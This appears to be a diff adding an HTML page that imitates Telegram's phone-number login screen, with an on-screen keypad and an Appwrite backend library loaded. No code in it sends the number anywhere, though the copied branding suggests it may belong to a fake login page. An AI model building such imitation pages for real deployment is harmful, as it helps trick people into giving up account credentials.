@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <h2>Your phone number</h2>
+        <p>Please confirm your country code and enter your phone number.</p>
+        <form id="phone-form">
+            <div class="input-group">
+                <label for="phone-number">Phone number</label>
+                <input type="text" id="phone-number" required placeholder="+" value="+"> <!-- Prewritten + -->
+            </div>
+            <div class="checkbox-group">
+                <input type="checkbox" id="sync-contacts" class="custom-checkbox" checked>
+                <label for="sync-contacts" style="left: -80px;">Sync Contacts</label>
+            </div>
+            <button type="submit" class="submit-btn">&#10140;</button> <!-- Arrow icon -->
+        </form>
+
+        <div class="number-keyboard">
+            <div class="key-row">
+                <button class="key">1</button>
+                <button class="key">2</button>
+                <button class="key">3</button>
+            </div>
+            <div class="key-row">
+                <button class="key">4</button>
+                <button class="key">5</button>
+                <button class="key">6</button>
+            </div>
+            <div class="key-row">
+                <button class="key">7</button>
+                <button class="key">8</button>
+                <button class="key">9</button>
+            </div>
+            <div class="key-rows">
+                <button class="key robber-btn">⌫</button> <!-- Robber button -->
+                <button class="key">0</button>
+            </div>
+        </div>
+        
+    </div>
+    <script src="https://cdn.jsdelivr.net/npm/appwrite@11.0.0"></script>
+
+
+    <script>
+        // Get references to the necessary elements
+        const phoneNumberInput = document.getElementById('phone-number');
+        const keys = document.querySelectorAll('.key');
+        
+        // Function to append number to the input
+        keys.forEach(key => {
+            key.addEventListener('click', () => {
+                const keyValue = key.innerText;
+
+                // Handle robber button (backspace functionality)
+                if (key.classList.contains('robber-btn')) {
+                    // Prevent removing the '+' sign
+                    if (phoneNumberInput.value.length > 1) {
+                        phoneNumberInput.value = phoneNumberInput.value.slice(0, -1); // Remove last character
+                    }
+                } else {
+                    // Prevent adding '+' if it's already there
+                    if (keyValue === '+' && phoneNumberInput.value.includes('+')) return;
+                    phoneNumberInput.value += keyValue; // Add key value to input
+                }
+            });
+        });
+
+
+        const phoneNumberInputa = document.getElementById('phone-number');
+        phoneNumberInput.addEventListener('focus', function() {
+        this.blur(); // Remove focus, which prevents the keyboard from appearing
+        });
+    </script>
+</body>
+</html>
